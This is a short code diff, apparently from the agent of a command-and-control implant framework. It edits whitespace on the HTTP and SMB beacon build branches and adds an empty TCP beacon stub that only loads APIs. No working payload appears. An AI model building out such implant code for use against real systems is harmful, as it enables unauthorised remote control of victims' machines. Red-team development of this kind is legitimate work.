@@ -7,7 +7,7 @@
 
 Agent* g_Agent;
 
-#if defined(BEACON_HTTP)
+#if defined(BEACON_HTTP) 
 
 #include "ConnectorHTTP.h"
 ConnectorHTTP* g_Connector;
@@ -81,7 +81,7 @@ void AgentMain()
 
 
 
-#elif defined(BEACON_SMB)
+#elif defined(BEACON_SMB) 
 
 #include "ConnectorSMB.h"
 ConnectorSMB* g_Connector;
@@ -164,6 +164,17 @@ void AgentMain()
 
 	g_Connector->CloseConnector();
 	AgentClear(g_Agent->config->exit_method);
+}
+
+
+
+#elif defined(BEACON_TCP)
+
+void AgentMain()
+{
+	if (!ApiLoad())
+		return;
+
 }
 #endif
 
